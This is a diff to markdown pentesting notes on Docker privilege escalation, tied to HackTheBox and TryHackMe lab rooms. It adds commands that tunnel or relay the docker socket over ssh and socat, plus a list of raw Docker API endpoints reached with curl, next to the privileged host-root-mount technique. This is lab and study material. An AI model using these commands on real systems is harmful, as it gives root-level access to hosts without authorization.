@@ -567,8 +567,6 @@ By exploring these files, you can see every changes applied to a docker image fr
 
 <div class="row row-cols-lg-2"><div>
 
-Note: [check for local TCP access to docker](https://docs.docker.com/config/daemon/remote-access/).
-
 #### Docker — Socket Privilege Escalation
 
 [![linuxprivilegeescalation](../../../../cybersecurity/_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
@@ -601,22 +599,51 @@ $ docker -H unix:///run/docker.sock run --rm -d --privileged -v /:/hostfs xxx ba
 $ docker -H unix:///run/docker.sock run --privileged -v /:/hostfs xxx ls
 ```
 
+We may not have `docker` on the target machine, in which case, we may use a tunnel and run `docker` on our machine with `-H`.
+
+```ps
+$ ssh -L /tmp/docker.sock:/run/docker.sock [...] # docker -H unix:///tmp/docker.sock
+$ socat -d -d TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock # docker -H IP:2375
+```
+
+We may interact directly with the socket too:
+
+```ps
+$ curl --unix-socket /tmp/docker.sock http://localhost/<endpoint> [...]
+/images/json # GET | list images
+/containers/create # POST | create a container
+/containers/<cid>/start  # GET | start a container
+/containers/<cid>/logs?stderr=1&stdout=1  # GET | container logs
+/containers/<cid>/exec # POST | prepare to execute a command on a container (TTY=True)
+/containers/<cid>/archive?path=/ # GET | create a tar.gz
+/exec/<eid>/start # POST | execute the prepared command (TTY=False, Detach=False)
+```
+
 <br>
 
 #### Docker — TCP Privilege Escalation
 
 [![couch](../../../../cybersecurity/_badges/thm-p/couch.svg)](https://tryhackme.com/r/room/couch)
 
-Docker can use TCP instead of a socket. It typically uses port `2375` 🐲. Refer to [docker socket notes](#docker--socket-privilege-escalation) with: `-H 127.0.0.1:2375`.
+Docker can use [TCP](https://docs.docker.com/config/daemon/remote-access/) instead of a socket. It typically uses port `2375` 🐲. Refer to [docker socket notes](#docker--socket-privilege-escalation) with: `-H 127.0.0.1:2375`.
+
+We may not have `docker` on the target machine, in which case, we may use a tunnel and run `docker` on our machine with `-H`.
+
+```ps
+$ ssh -L 2375:localhost:2375 [...] # docker -H tcp://localhost:2375
+```
 
 <br>
+
+</div><div>
 
 #### Docker — SUID Abuse On Mounted Folder
 
 [![pythonplayground](../../../../cybersecurity/_badges/thm-p/pythonplayground.svg)](https://tryhackme.com/r/room/pythonplayground)
 
 If you are within a container as root and you are connected to the machine running the docker without any useful privileges, you can create a SUID script on a shared mount folder, assuming there is one.
-</div><div>
+
+<br>
 
 #### Docker — Credentials Harvesting
 
